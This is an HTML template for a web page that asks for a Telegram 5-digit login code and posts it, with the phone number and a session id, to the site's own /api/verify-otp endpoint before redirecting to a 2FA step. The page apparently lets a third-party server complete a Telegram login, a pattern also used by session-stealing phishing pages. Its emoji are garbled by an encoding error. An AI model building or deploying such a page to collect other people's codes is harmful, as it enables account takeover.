<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Enter 5-digit OTP</title>
    <style>
        body { font-family: Arial; padding: 20px; background: #f0f2f5; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 15px; }
        h2 { color: #333; text-align: center; }
        .phone-display { background: #e3f2fd; padding: 15px; border-radius: 8px; text-align: center; margin: 20px 0; }
        input { width: 100%; padding: 15px; font-size: 20px; text-align: center; letter-spacing: 10px; }
        button { width: 100%; padding: 15px; background: #4CAF50; color: white; border: none; border-radius: 8px; font-size: 16px; }
        .note { color: #666; font-size: 14px; margin-top: 10px; text-align: center; }
        .error { color: #f44336; padding: 10px; background: #ffebee; border-radius: 5px; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h2>ðŸ”¢ Enter 5-digit OTP</h2>
        
        <div class="phone-display">
            ðŸ“± Phone: {{ phone }}
        </div>
        
        <p><b>Note:</b> Telegram sends <b>5-digit</b> OTP codes</p>
        
        <input type="text" id="otp" 
               placeholder="12345" 
               maxlength="5" 
               pattern="\d{5}"
               oninput="this.value = this.value.replace(/\D/g, '').slice(0,5)">
        
        <div class="note">Enter exactly 5 digits (no spaces)</div>
        
        <button onclick="verifyOTP()" style="margin-top: 20px;">
            âœ… Verify OTP
        </button>
        
        <div id="message" class="error" style="display: none;"></div>
    </div>

    <script>
        const sessionId = "{{ session_id }}";
        const phone = "{{ phone }}";
        
        function verifyOTP() {
            const otpInput = document.getElementById('otp');
            const otp = otpInput.value;
            
            // Validate 5 digits
            if (otp.length !== 5 || !/^\d{5}$/.test(otp)) {
                showMessage('Please enter exactly 5 digits (e.g., 12345)');
                return;
            }
            
            // Show loading
            const btn = document.querySelector('button');
            btn.innerHTML = 'â³ Verifying...';
            btn.disabled = true;
            
            // Send to server
            fetch('/api/verify-otp', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    session_id: sessionId,
                    phone: phone,
                    otp: otp
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    if (data.requires_2fa) {
                        // Redirect to 2FA page
                        window.location.href = data.redirect;
                    } else {
                        // Success, go to success page
                        window.location.href = data.redirect;
                    }
                } else {
                    showMessage('Error: ' + data.error);
                    btn.innerHTML = 'âœ… Verify OTP';
                    btn.disabled = false;
                }
            })
            .catch(error => {
                showMessage('Network error. Please try again.');
                btn.innerHTML = 'âœ… Verify OTP';
                btn.disabled = false;
            });
        }
        
        function showMessage(text) {
            const msgDiv = document.getElementById('message');
            msgDiv.textContent = text;
            msgDiv.style.display = 'block';
        }
        
        // Auto-focus input
        document.getElementById('otp').focus();
    </script>
</body>
</html>
